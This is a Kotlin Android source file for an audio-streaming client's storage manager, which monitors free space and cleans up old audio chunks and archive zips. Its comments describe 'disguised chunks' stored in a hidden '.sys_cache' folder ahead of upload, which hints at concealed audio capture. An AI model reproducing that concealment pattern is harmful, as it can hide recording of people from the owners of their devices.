package com.audiostream.client

import android.content.Context
import android.os.StatFs
import java.io.File

/**
 * StorageManager.kt — Local storage monitoring and cleanup.
 *
 * Monitors available disk space, cleans up completed uploads,
 * and provides storage stats for the UI notification.
 *
 * Storage thresholds:
 *   - WARNING at < 500 MB free
 *   - CRITICAL at < 100 MB free
 */

class StorageManager(private val context: Context) {

    companion object {
        const val WARNING_THRESHOLD_MB = 500L
        const val CRITICAL_THRESHOLD_MB = 100L
    }

    // Directory where disguised chunks are stored in hidden internal app storage
    private val chunksDir: File
        get() {
            return File(context.filesDir, ".sys_cache").also { it.mkdirs() }
        }

    // Directory where compressed offline archives (100-chunk & 500-chunk master zips) are stored
    private val archivesDir: File
        get() {
            return File(context.filesDir, ".sys_cache/archives").also { it.mkdirs() }
        }

    /**
     * Enforce a 200MB minimum free space limit.
     * Deletes the oldest chunk files and archives until space is reclaimed.
     */
    fun enforceStorageLimit() {
        val requiredMB = 200L
        while (true) {
            val availableMB = getAvailableSpace() / (1024 * 1024)
            if (availableMB >= requiredMB) break
            
            // Need more space, first delete oldest chunk (.dat or .aac)
            val oldestChunk = chunksDir.listFiles()
                ?.filter { it.isFile && (it.extension == "dat" || it.extension == "aac") }
                ?.minByOrNull { it.lastModified() }
                
            if (oldestChunk != null && oldestChunk.delete()) {
                // Successfully deleted, loop will check space again
                continue
            }

            // If no loose chunks left, delete oldest archive zip
            val oldestArchive = archivesDir.listFiles()
                ?.filter { it.isFile && it.extension == "zip" }
                ?.minByOrNull { it.lastModified() }
            if (oldestArchive != null && oldestArchive.delete()) {
                // Successfully deleted archive
                continue
            }
            
            break
        }
    }

    /**
     * Get the directory for storing audio chunks.
     */
    fun getChunksDirectory(): File = chunksDir

    /**
     * Get the directory for storing offline archive ZIP files.
     */
    fun getArchivesDirectory(): File = archivesDir

    /**
     * Get available storage space in bytes.
     */
    fun getAvailableSpace(): Long {
        return try {
            val stat = StatFs(context.filesDir.absolutePath)
            stat.availableBlocksLong * stat.blockSizeLong
        } catch (e: Exception) {
            0L
        }
    }

    /**
     * Get total storage space in bytes.
     */
    fun getTotalSpace(): Long {
        return try {
            val stat = StatFs(context.filesDir.absolutePath)
            stat.blockCountLong * stat.blockSizeLong
        } catch (e: Exception) {
            0L
        }
    }

    // Thread-safe in-memory cache to prevent repeated disk I/O scans
    private val cachedChunksSize = java.util.concurrent.atomic.AtomicLong(-1L)
    private val cachedChunksCount = java.util.concurrent.atomic.AtomicInteger(-1)

    private fun initCacheIfNeeded() {
        if (cachedChunksCount.get() < 0) {
            try {
                val files = chunksDir.listFiles()?.filter { it.isFile && (it.extension == "dat" || it.extension == "aac") }
                val count = files?.size ?: 0
                val size = files?.sumOf { it.length() } ?: 0L
                cachedChunksCount.set(count)
                cachedChunksSize.set(size)
            } catch (e: Exception) {
                cachedChunksCount.set(0)
                cachedChunksSize.set(0L)
            }
        }
    }

    fun notifyChunkAdded(fileSize: Long) {
        initCacheIfNeeded()
        cachedChunksCount.incrementAndGet()
        cachedChunksSize.addAndGet(fileSize)
    }

    fun notifyChunkDeleted(fileSize: Long) {
        initCacheIfNeeded()
        cachedChunksCount.decrementAndGet().coerceAtLeast(0)
        cachedChunksSize.addAndGet(-fileSize).coerceAtLeast(0L)
    }

    /**
     * Get the size of all chunk files currently stored locally.
     * Uses in-memory cache to eliminate continuous disk I/O overhead.
     */
    fun getLocalChunksSize(): Long {
        initCacheIfNeeded()
        return cachedChunksSize.get().coerceAtLeast(0L)
    }

    /**
     * Get count of local chunk files.
     * Uses in-memory cache to eliminate continuous disk I/O overhead.
     */
    fun getLocalChunkCount(): Int {
        initCacheIfNeeded()
        return cachedChunksCount.get().coerceAtLeast(0)
    }

    /**
     * Check storage health.
     * Returns: "ok", "warning", or "critical"
     */
    fun checkStorageHealth(): String {
        val availableMB = getAvailableSpace() / (1024 * 1024)
        return when {
            availableMB < CRITICAL_THRESHOLD_MB -> "critical"
            availableMB < WARNING_THRESHOLD_MB -> "warning"
            else -> "ok"
        }
    }

    /**
     * Delete a chunk file by its path.
     * Returns true if deleted, false otherwise.
     */
    fun deleteChunkFile(filePath: String): Boolean {
        return try {
            val file = File(filePath)
            if (file.exists() && file.absolutePath.startsWith(chunksDir.absolutePath)) {
                val len = file.length()
                if (file.delete()) {
                    notifyChunkDeleted(len)
                    true
                } else {
                    false
                }
            } else {
                false
            }
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Clean up any orphaned temporary files.
     * (Files with .tmp extension that may have been left from crashes)
     */
    fun cleanupTempFiles(): Int {
        var count = 0
        try {
            chunksDir.listFiles()
                ?.filter { it.isFile && it.extension == "tmp" }
                ?.forEach {
                    if (it.delete()) count++
                }
        } catch (e: Exception) {
            // Ignore
        }
        return count
    }

    /**
     * Format bytes to human-readable string.
     */
    fun formatSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> "${bytes / 1024} KB"
            bytes < 1024 * 1024 * 1024 -> "${bytes / (1024 * 1024)} MB"
            else -> String.format("%.1f GB", bytes / (1024.0 * 1024 * 1024))
        }
    }

    /**
     * Get a storage info summary string for the notification.
     */
    fun getStorageSummary(): String {
        val available = formatSize(getAvailableSpace())
        val localSize = formatSize(getLocalChunksSize())
        val localCount = getLocalChunkCount()
        return "Free: $available | Local: $localSize ($localCount files)"
    }
}
